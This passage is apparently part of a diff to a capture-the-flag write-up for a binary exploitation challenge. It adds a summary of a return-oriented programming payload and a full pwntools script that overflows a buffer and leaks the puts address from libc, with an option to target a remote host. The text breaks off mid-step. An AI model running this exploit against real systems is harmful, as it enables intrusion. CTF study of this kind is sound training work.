@@ -101,8 +101,73 @@ I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mer
 ![image](https://user-images.githubusercontent.com/70703371/223365541-830ca543-3b8e-480d-b7ef-90f9bcc64b46.png)
 
 
-> GET THE PUTS@GOT
+> GET THE PUTS@GOT (USING PWNTOOLS) FOR THIS -> 0x601018
 
+![image](https://user-images.githubusercontent.com/70703371/223365888-9c017687-ff5d-436c-9f4c-2790f19080f4.png)
+
+
+20. To summarize, the payloads we need to send are:
+
+```
+padding (RIP offset),
+pop_rdi,
+puts_got,
+puts_plt
+```
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './vuln_patched'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+lib = './libc.so.6'
+libc = context.binary = ELF(lib, checksec=False)
+
+sh = start()
+
+offsetRsp = 136 # padding to RIP
+
+puts_got = elf.got['puts']
+info('Puts Got: %#0x', puts_got)
+
+pop_rdi_gadget = 0x0000000000400913
+info('RDI: %#0x', pop_rdi_gadget)
+
+puts_plt = elf.plt['puts']
+info('Puts PLT: %#0x', puts_plt)
+
+p = flat([
+    asm('nop')*offsetRsp,
+    pop_rdi_gadget,
+    puts_got,
+    puts_plt
+])
+
+sh.sendline(p)
+
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/223367470-ae362321-9b99-473a-bd18-2db16cb8637a.png)
+
+
+21. Got 3 results.
+22. 
 
 
 
